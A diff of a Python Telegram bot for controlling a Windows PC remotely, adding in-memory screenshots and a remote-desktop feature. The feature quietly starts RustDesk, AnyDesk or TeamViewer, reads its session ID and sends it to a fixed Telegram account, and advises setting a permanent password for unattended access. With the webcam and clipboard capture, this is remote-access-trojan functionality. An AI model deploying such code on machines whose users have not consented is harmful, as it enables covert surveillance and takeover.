@@ -11,6 +11,10 @@ import webbrowser
 import subprocess
 import time
 import datetime
+import io
+import re
+import shutil
+from PIL import Image
 
 # --- ДОДАТКОВІ МОДУЛІ ДЛЯ НОВИХ ФУНКЦІЙ ---
 import pyttsx3
@@ -23,8 +27,8 @@ time.sleep(15)
 MY_ID = "7678008217" # Твій ID
 PC_NAME = platform.node()
 
-# --- ВЕРСІЯ 2.6 (МЕНЮ РОЗІГРАШІВ) ---
-BOT_VERSION = "2.6 (Меню розіграшів)"
+# --- ВЕРСІЯ 2.7 (ШВИДКИЙ СКРІНШОТ + ВІДДАЛЕНИЙ ДОСТУП) ---
+BOT_VERSION = "2.7 (Швидкий скріншот + Віддалений доступ)"
 
 # Папка бота за дефолтом
 botDir = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'ControlPC')
@@ -63,8 +67,9 @@ def get_media_menu():
 def get_system_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row("📝 Процеси", "📸 Фото з камери")
-    markup.row("📋 Буфер обміну", "🔙 Головне меню")
+    markup.row("📋 Буфер обміну", "🖥 Дистанційне керування")
     markup.row("❌ Вимкнути ПК", "🔄 Перезавантажити")
+    markup.add("🔙 Головне меню")
     return markup
 
 def get_files_menu():
@@ -301,6 +306,241 @@ def record_audio_func():
         bot.send_message(MY_ID, f"❌ Помилка запису: {e}")
 
 # ==========================================
+# 3.1 ШВИДКИЙ СКРІНШОТ (JPEG У ПАМ'ЯТІ)
+# ==========================================
+SCREEN_MAX_WIDTH = 1920        # макс. ширина скріншота (менше = швидше відправка)
+SCREEN_MAX_SIZE_KB = 280       # цільовий розмір JPEG (тримаємось ліміту 200-300 КБ)
+SCREEN_JPEG_QUALITY = 75       # стартова якість JPEG
+PIL_LANCZOS = getattr(getattr(Image, "Resampling", Image), "LANCZOS", 1)
+
+def capture_screen_io(max_width=SCREEN_MAX_WIDTH, max_size_kb=SCREEN_MAX_SIZE_KB, quality=SCREEN_JPEG_QUALITY):
+    """Робить скріншот відразу в пам'ять (io.BytesIO), без запису на диск.
+
+    Повертає готовий до відправки JPEG-буфер розміром до max_size_kb.
+    """
+    shot = pyautogui.screenshot()          # PIL.Image у пам'яті
+    if shot.mode != "RGB":
+        shot = shot.convert("RGB")
+
+    # Зменшуємо роздільну здатність, якщо екран завеликий
+    if max_width and shot.width > max_width:
+        new_height = max(1, int(shot.height * max_width / shot.width))
+        shot = shot.resize((max_width, new_height), PIL_LANCZOS)
+
+    buffer = io.BytesIO()
+    shot.save(buffer, format="JPEG", quality=quality, optimize=True)
+
+    # Якщо файл все ще завеликий - знижуємо якість (до 35), а далі роздільну здатність
+    while buffer.tell() > max_size_kb * 1024 and (quality > 35 or shot.width > 640):
+        if quality > 35:
+            quality -= 10
+        else:
+            shot = shot.resize((max(1, int(shot.width * 0.8)), max(1, int(shot.height * 0.8))), PIL_LANCZOS)
+        buffer = io.BytesIO()
+        shot.save(buffer, format="JPEG", quality=quality, optimize=True)
+
+    buffer.seek(0)
+    buffer.name = "screen.jpg"             # telebot визначає формат за іменем
+    return buffer
+
+# ==========================================
+# 3.2 ВІДДАЛЕНИЙ ДОСТУП (RustDesk / AnyDesk / TeamViewer)
+# ==========================================
+CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+
+REMOTE_PROGRAMS = [
+    {
+        "name": "RustDesk",
+        "process": "rustdesk.exe",
+        "paths": [
+            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "RustDesk", "rustdesk.exe"),
+            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "RustDesk", "rustdesk.exe"),
+            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "RustDesk", "rustdesk.exe"),
+            os.path.join(os.environ.get("APPDATA", ""), "RustDesk", "rustdesk.exe"),
+            os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "RustDesk", "rustdesk.exe"),
+        ],
+        "id_args": ["--get-id"],
+        "config_path": os.path.join(os.environ.get("APPDATA", ""), "RustDesk", "config", "RustDesk.toml"),
+        "config_key": "id",
+    },
+    {
+        "name": "AnyDesk",
+        "process": "AnyDesk.exe",
+        "paths": [
+            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "AnyDesk", "AnyDesk.exe"),
+            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "AnyDesk", "AnyDesk.exe"),
+            os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "AnyDesk", "AnyDesk.exe"),
+            os.path.join(os.environ.get("APPDATA", ""), "AnyDesk", "AnyDesk.exe"),
+        ],
+        "id_args": ["--get-id"],
+        "config_path": os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "AnyDesk", "system.conf"),
+        "config_key": "ad.anynet.id",
+    },
+    {
+        "name": "TeamViewer",
+        "process": "TeamViewer.exe",
+        "paths": [
+            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "TeamViewer", "TeamViewer.exe"),
+            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "TeamViewer", "TeamViewer.exe"),
+        ],
+        "id_args": None,        # у TeamViewer немає CLI для ID - беремо з реєстру
+        "config_path": None,
+        "config_key": None,
+        "from_registry": True,
+    },
+]
+
+def _remote_find_process(process_name):
+    """Шукає запущений процес за іменем. Повертає шлях до exe або None."""
+    for proc in psutil.process_iter(["name", "exe"]):
+        try:
+            info = proc.info
+            if (info.get("name") or "").lower() == process_name.lower():
+                return info.get("exe") or process_name
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return None
+
+def _remote_find_exe(prog):
+    """Повертає (шлях_до_exe, чи_вже_запущена)."""
+    running_exe = _remote_find_process(prog["process"])
+    for path in prog["paths"]:
+        if path and os.path.exists(path):
+            return path, running_exe is not None
+    found = shutil.which(prog["process"])
+    if found:
+        return found, running_exe is not None
+    if running_exe and os.path.exists(running_exe):
+        return running_exe, True
+    return None, running_exe is not None
+
+def _remote_normalize_id(raw):
+    """Прибирає зайві символи з ID (лапки, пробіли, 'ID:')."""
+    raw = (raw or "").strip().strip("'\"")
+    digits = re.sub(r"\D", "", raw)
+    return digits if len(digits) >= 5 else raw
+
+def _remote_read_config_id(prog):
+    """Читає ID з конфігураційного файлу програми (RustDesk.toml / system.conf)."""
+    path, key = prog.get("config_path"), prog.get("config_key")
+    if not path or not key or not os.path.exists(path):
+        return ""
+    try:
+        with open(path, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                line = line.strip()
+                if line.lower().startswith(key.lower()) and "=" in line:
+                    value = line.split("=", 1)[1].strip().strip("'\"")
+                    if value:
+                        return value
+    except Exception:
+        pass
+    return ""
+
+def _remote_read_teamviewer_id():
+    """Бере TeamViewer ID з реєстру Windows (ClientID)."""
+    try:
+        import winreg
+    except ImportError:
+        return ""
+    locations = [
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\TeamViewer"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TeamViewer"),
+        (winreg.HKEY_CURRENT_USER, r"Software\TeamViewer"),
+    ]
+    for root, path in locations:
+        try:
+            with winreg.OpenKey(root, path) as reg_key:
+                client_id, _ = winreg.QueryValueEx(reg_key, "ClientID")
+            digits = str(int(client_id)).zfill(10)
+            return f"{digits[:3]} {digits[3:6]} {digits[6:]}"
+        except (OSError, ValueError, TypeError):
+            continue
+    return ""
+
+def _remote_get_id(prog, exe):
+    """ID сесії: спершу через CLI (--get-id), далі з конфігу або реєстру."""
+    if exe and prog.get("id_args") and os.path.exists(exe):
+        try:
+            result = subprocess.run([exe] + prog["id_args"], capture_output=True, text=True,
+                                    timeout=8, creationflags=CREATE_NO_WINDOW)
+            lines = [ln.strip() for ln in (result.stdout or "").splitlines() if ln.strip()]
+            for line in reversed(lines):
+                digits = re.sub(r"\D", "", line)
+                if len(digits) >= 5:
+                    return digits
+            if lines:
+                return _remote_normalize_id(lines[-1])
+        except Exception:
+            pass
+    if prog.get("from_registry"):
+        return _remote_read_teamviewer_id()
+    return _remote_normalize_id(_remote_read_config_id(prog))
+
+def remote_desktop_worker():
+    """Перевіряє/запускає програму віддаленого доступу і надсилає ID сесії в Telegram."""
+    try:
+        found = None
+        for prog in REMOTE_PROGRAMS:
+            exe, was_running = _remote_find_exe(prog)
+            if exe:
+                found = (prog, exe, was_running)
+                break
+
+        if not found:
+            bot.send_message(
+                MY_ID,
+                "❌ Не знайдено жодної програми для віддаленого керування.\n\n"
+                "Встанови RustDesk (rustdesk.com) або AnyDesk (anydesk.com) на цей ПК "
+                "і натисни кнопку ще раз.",
+                reply_markup=get_system_menu())
+            return
+
+        prog, exe, was_running = found
+
+        if not was_running:
+            bot.send_message(MY_ID, f"🚀 Запускаю {prog['name']}...")
+            try:
+                subprocess.Popen([exe], creationflags=CREATE_NO_WINDOW)
+            except Exception:
+                os.startfile(exe)
+            time.sleep(4)   # даємо програмі час підняти службу та згенерувати ID
+
+        remote_id = ""
+        for _ in range(4):
+            remote_id = _remote_get_id(prog, exe)
+            if remote_id:
+                break
+            time.sleep(3)
+
+        status = "вже була запущена" if was_running else "щойно запущена"
+
+        if remote_id:
+            text = (
+                f"🖥 *Дистанційне керування готове!*\n\n"
+                f"📦 Програма: {prog['name']} ({status})\n"
+                f"🆔 ID сесії: `{remote_id}`\n\n"
+                f"📱 Як підключитись з телефону:\n"
+                f"1. Встанови {prog['name']} на телефон.\n"
+                f"2. Введи ID `{remote_id}`.\n"
+                f"3. Введи пароль із вікна {prog['name']} на ПК.\n\n"
+                f"💡 Порада: увімкни постійний пароль у налаштуваннях {prog['name']} (Security), "
+                f"щоб підключатися без підтвердження на ПК."
+            )
+        else:
+            text = (
+                f"🖥 {prog['name']} ({status}), але ID не вдалося прочитати автоматично.\n\n"
+                f"👀 Подивись ID у вікні програми на ПК і введи його на телефоні."
+            )
+
+        try:
+            bot.send_message(MY_ID, text, parse_mode="Markdown", reply_markup=get_system_menu())
+        except Exception:
+            bot.send_message(MY_ID, text, reply_markup=get_system_menu())
+    except Exception as e:
+        bot.send_message(MY_ID, f"❌ Помилка віддаленого доступу: {e}")
+
+# ==========================================
 # 4. ГОЛОВНИЙ ОБРОБНИК КОМАНД ТА КНОПОК
 # ==========================================
 @bot.message_handler(content_types=['text'])
@@ -334,9 +574,11 @@ def handle_text(message):
     elif msg == "🔇 Мут": pyautogui.press("volumemute")
     elif msg == "⏯ Плей/Пауза": pyautogui.press("playpause")
     elif msg == "🖥 Скріншот":
-        pyautogui.screenshot("screen.png")
-        with open("screen.png", "rb") as f: bot.send_photo(MY_ID, f)
-        os.remove("screen.png")
+        try:
+            screen_buf = capture_screen_io()
+            bot.send_photo(MY_ID, screen_buf)
+        except Exception as e:
+            bot.send_message(MY_ID, f"❌ Не вдалося зробити скріншот: {e}")
     
     # --- СИСТЕМА ТА ІНШЕ ---
     elif msg == "📸 Фото з камери":
@@ -351,6 +593,9 @@ def handle_text(message):
             cap.release()
         else:
             bot.send_message(MY_ID, "❌ Камера не знайдена або зайнята іншою програмою.")
+    elif msg == "🖥 Дистанційне керування":
+        bot.send_message(MY_ID, "🔎 Перевіряю RustDesk / AnyDesk на ПК...")
+        threading.Thread(target=remote_desktop_worker, daemon=True).start()
     elif msg == "📝 Процеси":
         procs = sorted(psutil.process_iter(['name', 'memory_percent']), key=lambda x: x.info['memory_percent'], reverse=True)[:5]
         text = "🔝 ТОП-5 процесів:\n" + "\n".join([f"🔸 {p.info['name']} ({round(p.info['memory_percent'],1)}%)" for p in procs])
